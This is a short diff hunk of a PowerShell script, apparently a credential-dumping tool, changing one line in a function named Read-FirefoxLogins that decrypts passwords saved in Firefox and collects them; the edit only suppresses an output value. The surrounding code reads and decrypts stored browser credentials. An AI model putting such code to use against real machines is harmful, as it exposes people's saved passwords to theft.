@@ -942,7 +942,7 @@ function Read-FirefoxLogins {
         try{
             $_item[2] = (FFDecrypt-CipherText $login.encryptedPassword)
         }catch{}
-        $_rows.Add($_item)
+        $_rows.Add($_item) > $null
     }
     return $_rows
 }
